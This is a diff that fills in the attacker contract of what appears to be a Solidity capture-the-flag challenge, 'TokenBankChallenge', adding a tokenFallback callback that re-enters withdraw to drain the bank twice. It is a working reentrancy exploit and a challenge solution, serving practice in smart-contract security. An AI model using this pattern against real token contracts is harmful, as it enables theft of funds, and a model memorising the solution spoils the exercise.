@@ -130,11 +130,28 @@ contract TokenBankChallenge {
 }
 
 // Write your exploit contract below
-contract TokenBankAttacker {
+contract TokenBankAttacker is ITokenReceiver {
     TokenBankChallenge public challenge;
+
+    uint8 public count = 0;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
     }
     // Write your exploit functions here
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) public override {
+        if (from == address(challenge) && count < 1) {
+            count++;
+            challenge.withdraw(value);
+        }
+    }
+
+    function exploit() public {
+        challenge.withdraw(challenge.balanceOf(address(this)));
+    }
+
 }
